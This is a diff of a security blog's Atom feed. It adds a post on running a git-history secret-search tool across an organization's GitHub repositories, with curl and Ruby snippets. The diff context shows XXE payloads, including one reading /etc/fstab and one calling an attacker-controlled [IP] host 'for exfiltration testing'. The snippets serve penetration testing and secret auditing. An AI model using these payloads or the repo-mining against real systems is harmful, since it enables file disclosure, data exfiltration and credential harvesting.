@@ -4,7 +4,7 @@
   <title><![CDATA[Silent Robot Systems]]></title>
   <link href="http://www.silentrobots.com/atom.xml" rel="self"/>
   <link href="http://www.silentrobots.com/"/>
-  <updated>2014-10-26T17:17:33-04:00</updated>
+  <updated>2015-01-12T12:51:46-05:00</updated>
   <id>http://www.silentrobots.com/</id>
   <author>
     <name><![CDATA[Willis Vandevanter]]></name>
@@ -14,7 +14,80 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Searching through git commits]]></title>
+    <title type="html"><![CDATA[Search all Github Repositories for an Organization]]></title>
+    <link href="http://www.silentrobots.com/blog/2015/01/09/gumbler-updates/"/>
+    <updated>2015-01-09T23:00:00-05:00</updated>
+    <id>http://www.silentrobots.com/blog/2015/01/09/gumbler-updates</id>
+    <content type="html"><![CDATA[<p><a href="https://github.com/BuffaloWill/gumbler">gumbler</a> is a script I wrote to search through git commits and introduced in the blog post <a href="http://www.silentrobots.com/blog/2014/10/06/gumbler/">&ldquo;Searching Through Git Commits&rdquo;</a>. Recently I wanted to run Gumbler across all repositories for an organization, the steps are discussed below. <!--more--></p>
+
+<p>First, we need to grab a list of repositories for the ORG. This can be done using the API</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl "https://api.github.com/orgs/[ORG NAME]/repos?page=1&per_page=10000" &gt; repos.json
+</span><span class='line'>curl "https://api.github.com/orgs/[ORG NAME]/repos?page=2&per_page=10000" &gt;&gt; repos.json
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note, the API limits the number of values returned so you will want to update the page count to make sure you get them all.</p>
+
+<p>Next we iterate through each repository, clone it, and run gumbler across the repo. A simple Ruby script is given below. Note, ignore any repos that were forked as they aren&rsquo;t specific to the orgnization.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>require 'json'
+</span><span class='line'>
+</span><span class='line'># specify repos.json as an argument
+</span><span class='line'>file = File.read(ARGV[0])
+</span><span class='line'>
+</span><span class='line'># parse the json
+</span><span class='line'>data_hash = JSON.parse(file)
+</span><span class='line'>
+</span><span class='line'># iterate each hash
+</span><span class='line'>data_hash.each do |hash|
+</span><span class='line'>  # ignore forked repos
+</span><span class='line'>  if !(hash["fork"])
+</span><span class='line'>      puts "|+| Testing #{hash["name"]}"
+</span><span class='line'>      
+</span><span class='line'>      # clone the project
+</span><span class='line'>      `git clone https://github.com/[ORG]/#{hash["name"]}.git`
+</span><span class='line'>      
+</span><span class='line'>      # Gumbler requires full directory paths
+</span><span class='line'>      `ruby ~/gumbler/gumbler.rb -s -p #{hash["name"]} ~/[ORG]/results/`
+</span><span class='line'>
+</span><span class='line'>      sleep(3)
+</span><span class='line'>  end
+</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Searching Through Git Commits]]></title>
     <link href="http://www.silentrobots.com/blog/2014/10/06/gumbler/"/>
     <updated>2014-10-06T00:00:00-04:00</updated>
     <id>http://www.silentrobots.com/blog/2014/10/06/gumbler</id>
@@ -23,12 +96,9 @@
 <!-- more -->
 
 
-
-
 <h1>.gitignore</h1>
 
-
-<p>A gitignore file is used to specify files that should not be tracked by git (source <a href="http://git-scm.com/docs/gitignore">gitignore</a>). In the default case, gumbler will read the gitignore file for the project and search every revision for a case where  a file from gitignore was committed. Possible use cases would be as a pen tester looking for reconnaisance data (e.g. developer usernames/passwords, staging hosts/services, etc.) or a developer to verify projects did not previously commit &ldquo;secret&rdquo; data.</p>
+<p>A gitignore file is used to specify files that should not be tracked by git (source <a href="http://git-scm.com/docs/gitignore">gitignore</a>). In the default case, gumbler will read the gitignore file for the project and search every revision for a case where a file from gitignore was committed. Possible use cases would be as a pen tester looking for reconnaisance data (e.g. developer usernames/passwords, staging hosts/services, etc.) or a developer to verify projects did not previously commit “secret” data.</p>
 
 <p>I am a big fan of what Netflix is doing with regards to open source and security. After looking through a number of their projects, I noticied Priam has a few commits with non-damaging files from the gitignore.</p>
 
@@ -76,12 +146,11 @@
 </span><span class='line'>....</span></code></pre></td></tr></table></div></figure>
 
 
-<p>.classpath or .project are not damaging in this case and, hence, are used as the example. On a pen test or in collaborative projects I have found much worse (<i>cough</i> usernames, passwords). This shouldn&rsquo;t be that surprising.</p>
+<p>.classpath or .project are not damaging in this case and, hence, are used as the example. On a pen test or in collaborative projects I have found much worse (cough usernames, passwords). This shouldn’t be that surprising.</p>
 
 <h1>Searching Commit Logs</h1>
 
-
-<p>Another use case for gumbler is to look through commit history. Using Ruby on Rails as an example, we can search from for any commit with &ldquo;CVE&rdquo; in it. Gumbler will output a diff from the files changed in the commit.</p>
+<p>Another use case for gumbler is to look through commit history. Using Ruby on Rails as an example, we can search from for any commit with “CVE” in it. Gumbler will output a diff from the files changed in the commit.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -133,8 +202,6 @@
 </span><span class='line'>....</span></code></pre></td></tr></table></div></figure>
 
 
-<p></p>
-
 <p>As the README says, be careful using the tool as it uses Command Execution to search. A malicious git project could take advantage of this. Ping me with better ways to handle this.</p>
 ]]></content>
   </entry>
@@ -149,7 +216,7 @@
 <!-- more -->
 
 
-<p>XML headers:</p>
+<p>XML Headers:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -205,7 +272,7 @@
 </span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure>
 
 
-<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity - IBM</a>, I have not seen this work &ldquo;in the wild&rdquo;. Should be useful for exfiltration testing:</p>
+<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html]">XML Entity - IBM</a> I have not seen this work “in the wild”. Should be useful for exfiltration testing:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>
@@ -227,11 +294,12 @@
 
 <p>Useful Links:</p>
 
-<p><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></p>
+<ul>
+<li><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></li>
+<li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></li>
+</ul>
 
-<p><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></p>
 ]]></content>
   </entry>
   
